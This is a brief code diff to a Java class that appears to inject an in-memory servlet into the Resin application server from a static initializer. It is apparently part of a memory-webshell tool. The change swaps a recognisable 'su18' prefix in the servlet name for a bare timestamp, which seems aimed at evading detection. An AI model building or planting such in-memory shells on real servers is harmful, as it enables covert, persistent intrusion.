@@ -18,7 +18,7 @@ public class RSMSFromThread implements Servlet {
 
 	static {
 		try {
-			String servletName = "su18" + System.nanoTime();
+			String servletName = String.valueOf(System.nanoTime());
 
 			Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch" +
 					".ServletInvocation");
